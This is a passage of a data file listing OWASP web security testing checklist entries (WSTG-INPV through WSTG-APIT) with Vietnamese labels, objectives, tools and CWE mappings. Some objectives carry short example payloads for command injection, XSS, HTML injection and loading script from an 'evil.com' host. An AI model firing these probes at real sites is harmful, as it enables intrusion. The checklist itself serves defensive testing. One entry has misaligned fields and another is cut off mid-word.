+CWE: CWE-22, CWE-94, CWE-95, CWE-98, CWE-829
+
+--- [Mục dữ liệu thứ 66] ---
+ID: WSTG-INPV-12
+Tên kiểm thử (Name): Testing for Command Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify and assess the command injection points with special characters (i.e.: | ; & $ > < ' !)
+For example: ?doc=Doc1.pdf+|+Dir c:\
+Công cụ đề xuất (Tools): Burpsuite/ZAP Commix
+OWASP Top 10 Liên quan: A3
+CWE: CWE-77, CWE-78
+
+--- [Mục dữ liệu thứ 67] ---
+ID: WSTG-INPV-13
+Tên kiểm thử (Name): Testing for Format String Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application.
+Công cụ đề xuất (Tools): Immunity Canvas, Spike, MSF
+OWASP Top 10 Liên quan: A3
+CWE: CWE-134
+
+--- [Mục dữ liệu thứ 68] ---
+ID: WSTG-INPV-14
+Tên kiểm thử (Name): Testing for Incubated Vulnerability
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify injections that are stored and require a recall step to the stored injection. (i.e.: CSV Injection, Blind Stored XSS, File Upload)
+- Understand how a recall step could occur.
+- Set listeners or activate the recall step if possible.
+Công cụ đề xuất (Tools): Burpsuite/ZAP, BeEF
+OWASP Top 10 Liên quan: A3
+CWE: CWE-79, CWE-434, CWE-1236
+
+--- [Mục dữ liệu thứ 69] ---
+ID: WSTG-INPV-15
+Tên kiểm thử (Name): Testing for HTTP Splitting Smuggling
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable.
+- Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3, A4
+CWE: CWE-93, CWE-113, CWE-444
+
+--- [Mục dữ liệu thứ 70] ---
+ID: WSTG-INPV-16
+Tên kiểm thử (Name): Testing for HTTP Incoming Requests
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests.
+- Monitor HTTP traffic without changes of end user Browser proxy or client-side application.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 71] ---
+ID: WSTG-INPV-17
+Tên kiểm thử (Name): Testing for Host Header Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Assess if the Host header is being parsed dynamically in the application.
+- Bypass security controls that rely on the header.
+Công cụ đề xuất (Tools): Burpsuite/ZAP, Netcat
+OWASP Top 10 Liên quan: A4
+CWE: CWE-74, CWE-116
+
+--- [Mục dữ liệu thứ 72] ---
+ID: WSTG-INPV-18
+Tên kiểm thử (Name): Testing for Server-side Template Injection
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Detect template injection vulnerability points.
+- Identify the templating engine.
+- Build the exploit.
+Công cụ đề xuất (Tools): Burpsuite/ZAP, Tplmap
+OWASP Top 10 Liên quan: A4
+CWE: CWE-1336
+
+--- [Mục dữ liệu thứ 73] ---
+ID: WSTG-INPV-19
+Tên kiểm thử (Name): Testing for Server-Side Request Forgery
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify SSRF injection points.
+- Test if the injection points are exploitable.
+- Asses the severity of the vulnerability.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A10
+CWE: CWE-918
+
+--- [Mục dữ liệu thứ 74] ---
+ID: WSTG-INPV-20
+Tên kiểm thử (Name): Testing for Mass Assignment
+Hạng mục (Category): 7. Data Validation Testing
+Mục tiêu (Objectives): - Identify requests that modify objects
+- Assess if it is possible to modify fields never intended to be modified from outside
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-915
+
+--- [Mục dữ liệu thứ 75] ---
+ID: WSTG-ERRH-01
+Tên kiểm thử (Name): Testing for Improper Error Handling
+Hạng mục (Category): 8. Error Handling
+Mục tiêu (Objectives): - Identify existing error output (i.e.: Random files/folders (40x)
+- Analyze the different output returned.
+Công cụ đề xuất (Tools): 
+OWASP Top 10 Liên quan: Burpsuite/ZAP
+CWE: A5
+
+--- [Mục dữ liệu thứ 76] ---
+ID: WSTG-ERRH-02
+Tên kiểm thử (Name): Testing for Stack Traces
+Hạng mục (Category): 8. Error Handling
+Mục tiêu (Objectives): N/A, This content has been merged into: WSTG-ERRH-01
+Công cụ đề xuất (Tools): 
+OWASP Top 10 Liên quan: NA
+CWE: NA
+
+--- [Mục dữ liệu thứ 77] ---
+ID: WSTG-CRYP-01
+Tên kiểm thử (Name): Testing for Weak Transport Layer Security
+Hạng mục (Category): 9. Cryptography
+Mục tiêu (Objectives): - Validate the server configuration (Identify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)
+- Review the digital certificate's cryptographic strength and validity.
+- Ensure that the TLS security is not bypassable and is properly implemented across the application.
+Công cụ đề xuất (Tools): testssl.sh
+OWASP Top 10 Liên quan: A2, A7
+CWE: CWE-295, CWE-296, CWE-297, CWE-298, CWE-319, CWE-326, CWE-327, CWE-310, CWE-757
+
+--- [Mục dữ liệu thứ 78] ---
+ID: WSTG-CRYP-02
+Tên kiểm thử (Name): Testing for Padding Oracle
+Hạng mục (Category): 9. Cryptography
+Mục tiêu (Objectives): - Identify encrypted messages that rely on padding.
+- Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis.
+Công cụ đề xuất (Tools): PadBuster, POET
+OWASP Top 10 Liên quan: A2
+CWE: CWE-326, CWE-649
+
+--- [Mục dữ liệu thứ 79] ---
+ID: WSTG-CRYP-03
+Tên kiểm thử (Name): Testing for Sensitive Information Sent via Unencrypted Channels
+Hạng mục (Category): 9. Cryptography
+Mục tiêu (Objectives): - Identify sensitive information transmitted through the various channels.
+- Assess the privacy and security of the channels used.
+- Check sensitive data during the transmission:
+• Information used in authentication (e.g. Credentials, PINs, Session
+identifiers, Tokens, Cookies…)
+• Information protected by laws, regulations or specific organizational
+policy (e.g. Credit Cards, Customers data)
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A2
+CWE: CWE-311, CWE-319, CWE-523
+
+--- [Mục dữ liệu thứ 80] ---
+ID: WSTG-CRYP-04
+Tên kiểm thử (Name): Testing for Weak Encryption
+Hạng mục (Category): 9. Cryptography
+Mục tiêu (Objectives): - Provide a guideline for the identification weak encryption or hashing uses and implementations.
+Công cụ đề xuất (Tools): Testssl.sh, Nessus
+OWASP Top 10 Liên quan: A2
+CWE: CWE-261, CWE-320, CWE-321, CWE-322, CWE-323, CWE-324, CWE-325, CWE-326, CWE-327, CWE-328, CWE-329, CWE-330, CWE-331, CWE-335, CWE-336, CWE-337, CWE-338, CWE-340, CWE-347, CWE-354, CWE-759, CWE-760, CWE-780, CWE-798, CWE-916
+
+--- [Mục dữ liệu thứ 81] ---
+ID: WSTG-BUSL-01
+Tên kiểm thử (Name): Test Business Logic Data Validation
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Identify data injection points.
+- Validate that all checks are occurring on the back end and can't be bypassed.
+- Attempt to break the format of the expected data and analyze how the application is handling it.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-840
+
+--- [Mục dữ liệu thứ 82] ---
+ID: WSTG-BUSL-02
+Tên kiểm thử (Name): Test Ability to Forge Requests
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Review the project documentation looking for guessable, predictable, or hidden functionality of fields.
+- Insert logically valid data in order to bypass normal business logic workflow.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-840
+
+--- [Mục dữ liệu thứ 83] ---
+ID: WSTG-BUSL-03
+Tên kiểm thử (Name): Test Integrity Checks
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Review the project documentation for components of the system that move, store, or handle data.
+- Determine what type of data is logically acceptable by the component and what types the system should guard against.
+- Determine who should be allowed to modify or read that data in each component.
+- Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow.
+Công cụ đề xuất (Tools): Burp Proxy
+OWASP Top 10 Liên quan: A4
+CWE: CWE-840, CWE-472
+
+--- [Mục dữ liệu thứ 84] ---
+ID: WSTG-BUSL-04
+Tên kiểm thử (Name): Test for Process Timing
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Review the project documentation for system functionality that may be impacted by time. Such as execution time or actions that
+help users predict a future outcome or allow one to circumvent
+any part of the business logic or workflow. For example, not
+completing transactions in an expected time.
+- Develop and execute the mis-use cases ensuring that attackers
+can not gain an advantage based on any timing (Race Condition).
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-840, CWE-362
+
+--- [Mục dữ liệu thứ 85] ---
+ID: WSTG-BUSL-05
+Tên kiểm thử (Name): Test Number of Times a Function Can Be Used Limits
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Identify functions that must set limits to the times they can be called.
+- Assess if there is a logical limit set on the functions and if it is properly validated.
+- For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4, A7
+CWE: CWE-799
+
+--- [Mục dữ liệu thứ 86] ---
+ID: WSTG-BUSL-06
+Tên kiểm thử (Name): Testing for the Circumvention of Work Flows
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.
+- Develop a misuse case and try to circumvent every logic flow identified.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-841
+
+--- [Mục dữ liệu thứ 87] ---
+ID: WSTG-BUSL-07
+Tên kiểm thử (Name): Test Defenses Against Application Misuse
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Generate notes from all tests conducted against the system.
+- Review which tests had a different functionality based on aggressive input.
+- Understand the defenses in place and verify if they are enough to protect the system against bypassing techniques.
+- Measures that might indicate the application has in-built self-defense:
+• Changed responses
+• Blocked requests
+• Actions that log a user out or lock their account
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-693
+
+--- [Mục dữ liệu thứ 88] ---
+ID: WSTG-BUSL-08
+Tên kiểm thử (Name): Test Upload of Unexpected File Types
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Review the project documentation for file types that are rejected by the system.
+- Verify that the unwelcomed file types are rejected and handled safely. Also, check whether the website only check for "Content-type" or file extension.
+- Verify that file batch uploads are secure and do not allow any bypass against the set security measures.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-434, CWE-602
+
+--- [Mục dữ liệu thứ 89] ---
+ID: WSTG-BUSL-09
+Tên kiểm thử (Name): Test Upload of Malicious Files
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Identify the file upload functionality.
+- Review the project documentation to identify what file types are considered acceptable, and what types would be considered dangerous or malicious.
+- If documentation is not available then consider what would be appropriate based on the purpose of the application.
+- Determine how the uploaded files are processed.
+- Obtain or create a set of malicious files for testing.
+- Try to upload the malicious files to the application and determine whether it is ac
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-434
+
+--- [Mục dữ liệu thứ 90] ---
+ID: WSTG-BUSL-10
+Tên kiểm thử (Name): Test Payment Functionality
+Hạng mục (Category): 10. Business logic Testing
+Mục tiêu (Objectives): - Determine whether the business logic for the e-commerce functionality is robust.
+- Understand how the payment functionality works.
+- Determine whether the payment functionality is secure.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-472, CWE-602, CWE-807
+
+--- [Mục dữ liệu thứ 91] ---
+ID: WSTG-CLNT-01
+Tên kiểm thử (Name): Testing for DOM-Based Cross Site Scripting
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Identify DOM sinks.
+- Build payloads that pertain to every sink type. 
+For example: #<script>alert('xss')</script>
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-79
+
+--- [Mục dữ liệu thứ 92] ---
+ID: WSTG-CLNT-02
+Tên kiểm thử (Name): Testing for JavaScript Execution
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Identify sinks and possible JavaScript injection points.
+For example: ?javascript:alert(1)
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-79
+
+--- [Mục dữ liệu thứ 93] ---
+ID: WSTG-CLNT-03
+Tên kiểm thử (Name): Testing for HTML Injection
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Identify HTML injection points and assess the severity of the injected content.
+For example: page.html?user=<img%20src='aaa'%20onerror=alert(1)>
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-80
+
+--- [Mục dữ liệu thứ 94] ---
+ID: WSTG-CLNT-04
+Tên kiểm thử (Name): Testing for Client-side URL Redirect
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Identify injection points that handle URLs or paths.
+- Assess the locations that the system could redirect to (Open Redirect).
+For example: ?redirect=www.fake-target.site
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A4
+CWE: CWE-601
+
+--- [Mục dữ liệu thứ 95] ---
+ID: WSTG-CLNT-05
+Tên kiểm thử (Name): Testing for CSS Injection
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Identify CSS injection points.
+- Assess the impact of the injection.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-20
+
+--- [Mục dữ liệu thứ 96] ---
+ID: WSTG-CLNT-06
+Tên kiểm thử (Name): Testing for Client-side Resource Manipulation
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Identify sinks with weak input validation.
+- Assess the impact of the resource manipulation.
+For example: www.victim.com/#http://evil.com/js.js
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-20
+
+--- [Mục dữ liệu thứ 97] ---
+ID: WSTG-CLNT-07
+Tên kiểm thử (Name): Testing Cross Origin Resource Sharing
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Identify endpoints that implement CORS.
+- Ensure that the CORS configuration is secure or harmless.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A5
+CWE: CWE-942
+
+--- [Mục dữ liệu thứ 98] ---
+ID: WSTG-CLNT-08
+Tên kiểm thử (Name): Testing for Cross Site Flashing
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Decompile and analyze the application's code.
+- Assess sinks inputs and unsafe method usages.
+For example: file.swf?lang=http://evil
+Công cụ đề xuất (Tools): Flare, Flasm, SWF Intruder
+OWASP Top 10 Liên quan: A3
+CWE: CWE-79
+
+--- [Mục dữ liệu thứ 99] ---
+ID: WSTG-CLNT-09
+Tên kiểm thử (Name): Testing for Clickjacking
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Understand security measures in place.
+- Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.
+- Assess how strict the security measures are and if they are bypassable.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A5
+CWE: CWE-1021
+
+--- [Mục dữ liệu thứ 100] ---
+ID: WSTG-CLNT-10
+Tên kiểm thử (Name): Testing WebSockets
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Identify the usage of WebSockets by inspecting ws:// or wss:// URI scheme.
+- Assess its implementation by using the same tests on normal HTTP channels.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A2, A3
+CWE: CWE-319, CWE-1347
+
+--- [Mục dữ liệu thứ 101] ---
+ID: WSTG-CLNT-11
+Tên kiểm thử (Name): Testing Web Messaging
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Assess the security of the message's origin.
+- Validate that it's using safe methods and validating its input.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A5
+CWE: CWE-1020
+
+--- [Mục dữ liệu thứ 102] ---
+ID: WSTG-CLNT-12
+Tên kiểm thử (Name): Testing Browser Storage
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Determine whether the website is storing sensitive data in client-side storage.
+- The code handling of the storage objects should be examined for possibilities of injection attacks, such as utilizing unvalidated input or vulnerable libraries.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A1, A4
+CWE: CWE-312, CWE-313, CWE-315, CWE-922
+
+--- [Mục dữ liệu thứ 103] ---
+ID: WSTG-CLNT-13
+Tên kiểm thử (Name): Testing for Cross Site Script Inclusion
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): - Locate sensitive data across the system.
+- Assess the leakage of sensitive data through various techniques.
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-79
+
+--- [Mục dữ liệu thứ 104] ---
+ID: WSTG-CLNT-14
+Tên kiểm thử (Name): Testing for Reverse Tabnabbing
+Hạng mục (Category): 11. Client Side Testing
+Mục tiêu (Objectives): N/A
+Công cụ đề xuất (Tools): Burpsuite/ZAP
+OWASP Top 10 Liên quan: A3
+CWE: CWE-1022
+
+--- [Mục dữ liệu thứ 105] ---
+ID: WSTG-APIT-01
+Tên kiểm thử (Name): Testing GraphQL
+Hạng mục (Category): 12. API Testing
+Mục tiêu (Objectives): - Assess that a secure and production-ready configuration is deployed.
+- Validate all input fields against generic attacks.
+- Ensure that proper access controls are applied.
+Công cụ đề xuất (Tools): Burpsuite/ZAP, GraphSQL Raider
+OWASP Top 10 Liên quan: A3
+CWE: CWE-1347
+
